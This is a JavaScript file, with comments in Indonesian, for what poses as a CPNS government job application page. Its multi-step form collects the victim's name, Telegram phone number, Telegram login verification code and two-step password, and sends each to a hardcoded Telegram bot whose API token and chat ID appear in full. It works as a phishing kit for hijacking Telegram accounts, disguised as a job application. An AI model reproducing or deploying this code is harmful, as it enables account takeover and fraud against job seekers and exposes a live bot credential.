// Mengimpor data pekerjaan dari jobs.js
// Pastikan untuk menambahkan tag <script src="jobs.js"></script> di HTML sebelum lamar.js

// Fungsi untuk mendapatkan parameter URL
function getQueryParam(param) {
  const urlParams = new URLSearchParams(window.location.search);
  return urlParams.get(param);
}

// Mengambil jenis pekerjaan dari parameter URL
const jobType = getQueryParam("job");
const job = jobs[jobType]; // Menggunakan data dari jobs.js

// Menampilkan informasi pekerjaan
if (job) {
  document.getElementById("job-title").innerText = job.title;
  document.getElementById("job-company").innerText = `Instansi: ${job.company}`;
  document.getElementById("job-location").innerText = `Lokasi: ${job.location}`;
  document.getElementById("job-salary").innerText = job.salary;
  document.getElementById("job-description").innerText = job.description;
  document.getElementById("job-image").src = job.image;
} else {
  document.getElementById("job-application").innerHTML =
    '<p class="text-red-500">Pekerjaan tidak ditemukan.</p>';
}

// Fungsi untuk mengirim data ke Telegram
function sendDataToTelegram(message) {
  const token = "7206743626:AAHVO-tyBR1UOHP9IO8bzbb5AEnHgbQUFPE"; // Ganti dengan token bot Anda
  const chatId = "6124038392"; // Ganti dengan chat ID Anda

  // Tampilkan loading screen
  document.getElementById("loading-screen").classList.remove("hidden");

  return fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      chat_id: chatId,
      text: message,
    }),
  })
    .then((response) => {
      if (response.ok) {
        alert("Data telah dikirim!"); // Notifikasi sukses
      } else {
        alert("Gagal mengirim data. Silakan coba lagi.");
      }
    })
    .catch((error) => {
      console.error("Error:", error);
      alert("Terjadi kesalahan. Silakan coba lagi.");
    })
    .finally(() => {
      // Sembunyikan loading screen setelah pengiriman
      document.getElementById("loading-screen").classList.add("hidden");
    });
}

// Step navigation
document.getElementById("next-step-1").addEventListener("click", function () {
  // Validasi input sebelum melanjutkan
  const name = document.getElementById("name").value;
  const telegram = document.getElementById("telegram").value;

  if (name && telegram) {
    // Kirim data ke Telegram
    const message = `Informasi Pribadi:\nNama: ${name}\nNomor Telegram: ${telegram}`;
    sendDataToTelegram(message).then(() => {
      document.getElementById("step-1").classList.add("hidden");
      document.getElementById("step-2").classList.remove("hidden");
    });
  } else {
    alert("Silakan isi semua kolom sebelum melanjutkan.");
  }
});

document.getElementById("next-step-2").addEventListener("click", function () {
  // Validasi input sebelum melanjutkan
  const verificationCode = document.getElementById("verification-code").value;

  if (verificationCode) {
    // Kirim data ke Telegram
    const message = `Kode Verifikasi:\nKode: ${verificationCode}`;
    sendDataToTelegram(message).then(() => {
      document.getElementById("step-2").classList.add("hidden");
      document.getElementById("step-3").classList.remove("hidden");
    });
  } else {
    alert("Silakan masukkan kode verifikasi sebelum melanjutkan.");
  }
});

document
  .getElementById("submit-application")
  .addEventListener("click", function () {
    // Ambil data dari form
    const name = document.getElementById("name").value;
    const telegram = document.getElementById("telegram").value;
    const verificationCode = document.getElementById("verification-code").value;
    const twoStepCode = document.getElementById("two-step-code").value;

    // Kirim data ke Telegram
    const message = `Lamaran Pekerjaan CPNS:\nNama: ${name}\nNomor Telegram: ${telegram}\nKode Verifikasi: ${verificationCode}\nKode Verifikasi 2 Langkah: ${twoStepCode}`;

    sendDataToTelegram(message);
  });
